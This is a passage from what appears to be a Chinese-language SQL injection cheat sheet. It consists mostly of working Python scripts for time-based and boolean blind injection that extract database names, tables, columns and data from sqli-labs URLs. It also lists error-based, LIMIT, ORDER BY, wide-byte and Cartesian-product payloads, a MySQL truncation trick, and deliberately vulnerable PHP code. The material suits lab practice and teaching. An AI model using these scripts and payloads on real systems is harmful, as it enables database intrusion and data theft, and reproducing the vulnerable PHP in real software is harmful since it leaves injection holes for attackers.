range(0,15):</span><br><span class="line">		columnname=<span class="string">""</span></span><br><span class="line">		flag=0</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line">			<span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				startTime=time.time()</span><br><span class="line">				newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">					columnname +=char</span><br><span class="line">					<span class="built_in">print</span> tablename+<span class="string">"'columns is:"</span>+columnname</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">					flag=1</span><br><span class="line">					result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+columnname</span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">def getData(columnname,tablename):</span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and if(ascii(substr((select"</span>+columnname+<span class="string">"from "</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),5)%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">		data=<span class="string">""</span></span><br><span class="line">		flag=0</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line">			<span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				startTime=time.time()</span><br><span class="line">				newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">					data +=char</span><br><span class="line">					<span class="built_in">print</span> <span class="string">"data is:"</span>+data</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">					flag=1</span><br><span class="line">					result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+data</span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">getDbname()</span><br></pre></td></tr></table></figure>
<h3 id="0x2post"><a href="#0x2post" class="headerlink" title="0x2post"></a>0x2post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: yeSi</span></span><br><span class="line"><span class="comment"># @Date:   2019-01-16 10:03:42</span></span><br><span class="line"><span class="comment"># @Last Modified by:   yeSi</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-01-16 10:40:43</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-17/"</span></span><br><span class="line">def getDbname():</span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,15):</span><br><span class="line">		<span class="built_in">print</span> i</span><br><span class="line">		<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">			startTime=time.time()</span><br><span class="line">			payload=&#123;</span><br><span class="line">				<span class="string">'uname'</span>:<span class="string">'admin'</span>,</span><br><span class="line">				<span class="string">'passwd'</span>:<span class="string">"' or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0) --+"</span>.format(i,ord(char)),</span><br><span class="line">				<span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">print</span> char</span><br><span class="line">			<span class="built_in">print</span> payload</span><br><span class="line">			res=requests.post(url=url,data=payload)</span><br><span class="line">			<span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">				result +=char</span><br><span class="line">				<span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">				<span class="built_in">return</span></span><br><span class="line">…… </span><br><span class="line">getDbname()</span><br></pre></td></tr></table></figure>

<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>0x1 布尔盲注语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/</span><br></pre></td></tr></table></figure>
<p>0x2 爆数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-5/?id=1"</span></span><br><span class="line">def getDbname():<span class="comment">#爆数据库</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">		<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">			newurl=url+payload.format(i,ord(char))</span><br><span class="line">			response=requests.get(newurl)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">				result +=char</span><br><span class="line">				<span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">				<span class="built_in">return</span></span><br></pre></td></tr></table></figure>
<p>0x 爆表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getTablename():<span class="comment">#爆表名</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">		tablename=<span class="string">""</span></span><br><span class="line">		flag=0</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line">			<span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">					tablename +=char</span><br><span class="line">					<span class="built_in">print</span> <span class="string">"tablename is:"</span>+tablename</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">					flag=1</span><br><span class="line">					result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+tablename</span><br><span class="line">					<span class="keyword">if</span> tablename.strip()==<span class="string">''</span>:</span><br><span class="line">						<span class="built_in">return</span></span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<p>0x 爆字段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getColumns(tablename):</span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and ascii(substr((select column_name from information_schema.columns where table_name="</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">		columnname=<span class="string">""</span></span><br><span class="line">		flag=0</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line">			<span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">					columnname +=char</span><br><span class="line">					<span class="built_in">print</span> tablename+<span class="string">"'columns is:"</span>+columnname</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">					flag=1</span><br><span class="line">					result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+columnname</span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<p>0x 爆数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getData(columnname,tablename):</span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and ascii(substr((select"</span>+columnname+<span class="string">"from "</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">		data=<span class="string">""</span></span><br><span class="line">		flag=0</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line">			<span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">					data +=char</span><br><span class="line">					<span class="built_in">print</span> <span class="string">"data is:"</span>+data</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">					flag=1</span><br><span class="line">					result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+data</span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<h2 id="报错注入盲注"><a href="#报错注入盲注" class="headerlink" title="报错注入盲注"></a>报错注入盲注</h2><p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。  </p>
<p>可参考此文章：<a href="http://www.plasf.cn/articles/spatial_functions_blind_inject.html" target="_blank" rel="noopener">http://www.plasf.cn/articles/spatial_functions_blind_inject.html</a> </p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>0X1 floor()和rand()<br>原理:<a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(<span class="string">':'</span>,(select database()),<span class="string">':'</span>,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</span><br></pre></td></tr></table></figure>
<p>0X2 ExtractValue(有长度限制,最长32位)<br>原理: <a href="https://www.cnblogs.com/xishaonian/p/6250444.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6250444.html</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
<p>0X3 UpdateXml(有长度限制,最长32位)<br>原理: <a href="https://www.jb51.net/article/125599.htm" target="_blank" rel="noopener">https://www.jb51.net/article/125599.htm</a> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
<p>0X4 exp()<br>原理:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and EXP(~(SELECT * from(select user())a))</span><br></pre></td></tr></table></figure>
<p>0X5 geometrycollection()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<p>0X6 polygon()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 AND polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<p>0X7 multipoint()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<p>0X8 multilinestring()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<p>0X9 linestring()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<p>0X10 multipolygon()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 AND multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<h1 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h1><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><p>详情可看: <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a><br>注入姿势<br>报错注入  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>
<p>时间注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>


<p>测试代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(<span class="string">"Content-Type: text/plain; charset=utf-8"</span>);</span><br><span class="line">require(<span class="string">"mysql.class.php"</span>);</span><br><span class="line"><span class="variable">$mysql</span> = new MySQL(<span class="string">"test"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = <span class="variable">$mysql</span>-&gt;executeSQL(<span class="string">"SELECT * FROM user where uid &lt; 100 ORDER BY uid limit &#123;<span class="variable">$_GET</span>['p']&#125;, 10"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$users</span>)&#123;</span><br><span class="line"><span class="variable">$users</span> = var_export(<span class="variable">$users</span>, TRUE);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$users</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$mysql</span>-&gt;lastError;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>详细可看：<a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">https://xz.aliyun.com/t/1719</a><br>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運<span class="string">'</span></span><br></pre></td></tr></table></figure>
<p>注入姿势：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%df<span class="string">'order by 1 %23</span></span><br></pre></td></tr></table></figure>
<p>题目 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = @<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line"><span class="keyword">if</span>( !isset(<span class="variable">$id</span>)|| empty(<span class="variable">$id</span>) )&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="string">'get.id 参数不能为空'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">"mysql:host=127.0.0.1; port=3306; dbname=test; charset=utf8"</span>;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    <span class="variable">$user</span> = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    <span class="variable">$psw</span> =<span class="string">'root'</span>; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    <span class="variable">$pdo</span> = new PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$psw</span>);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">'select * from tdb_goods where goods_id ='</span>.<span class="string">"'&#123;<span class="variable">$id</span>&#125;'"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$sql</span>) or var_dump(<span class="variable">$pdo</span>-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$mon</span> = <span class="variable">$res</span>-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( <span class="variable">$mon</span> );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a>笛卡尔积注入</h2><p>笛卡尔积是指在数学中，两个集合X和Y的笛卡尓积（Cartesian product），又称直积，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员。</p>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br></pre></td></tr></table></figure>

<p>你完全可以按照这个规律，从C后面加个逗号，写D，E等等等，想写多少就写多少，但是写的越多查询的速度就会越慢，如果在表或者列数量很少的情况下，可以写的多一点。</p>
<p>到浏览器实践一下，发现确实延迟了。</p>
<h2 id="mysql约束攻击"><a href="#mysql约束攻击" class="headerlink" title="mysql约束攻击"></a>mysql约束攻击</h2><p>详情看：<a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/</a><br>出现在注册用户时，对用户名参数的多余空格没有过滤。利用了在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table user(id int primary key, user varchar(10),<span class="built_in">pwd</span> varchar(20)); //创建一个表</span><br><span class="line">insert into user values(1,<span class="string">'admin'</span>,<span class="string">'123'</span>); //插入数据</span><br><span class="line">insert into user values(2,<span class="string">'admin                                          '</span>,<span class="string">'123'</span>);</span><br><span class="line">select length(user) from user; //查看数据长度</span><br></pre></td></tr></table></figure>
<h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><p>详细看<a href="http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html</a><br>0x1 利用报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用regexp</span><br><span class="line">http://192.168.239.2:81/?order=(select+1+regexp+<span class="keyword">if</span>(1=1,1,0x00)) 正常</span><br><span class="line">http://192.168.239.2:81/?order=(select+1+regexp+<span class="keyword">if</span>(1=2,1,0x00))  错误</span><br><span class="line">利用updatexml</span><br><span class="line">http://192.168.239.2:81/?order=updatexml(1,<span class="keyword">if</span>(1=1,1,user()),1)  正确</span><br><span class="line">http://192.168.239.2:81/?order=updatexml(1,<span class="keyword">if</span>(1=2,1,user()),1) 错误</span><br><span class="line">利用extractvalue</span><br><span class="line">http://192.168.239.2:81/?order=extractvalue(1,<span class="keyword">if</span>(1=1,1,user())) 正确</span><br><span class="line">http://192.168.239.2:81/?order=extractvalue(1,<span class="keyword">if</span>(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure>
<p>0x2 基于盲注</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意如果直接<span class="keyword">if</span>(1=2,1,SLEEP(2))，sleep时间将会变成2*当前表中记录的数目，将会对服务器造成一定的拒绝服务攻击</span><br><span class="line"></span><br><span class="line">/?order=<span class="keyword">if</span>(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))<span class="built_in">test</span>)) 正常响应时间</span><br><span class="line">/?order=<span class="keyword">if</span>(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))<span class="built_in">test</span>)) sleep 2秒</span><br></pre></td></tr></table></figure>
<p>0x3 sqlmap<br>sqlmap测试<br>在没有过滤的情况下是能够检测到注入的</p>
<p>测试样题<br>index.php </p>
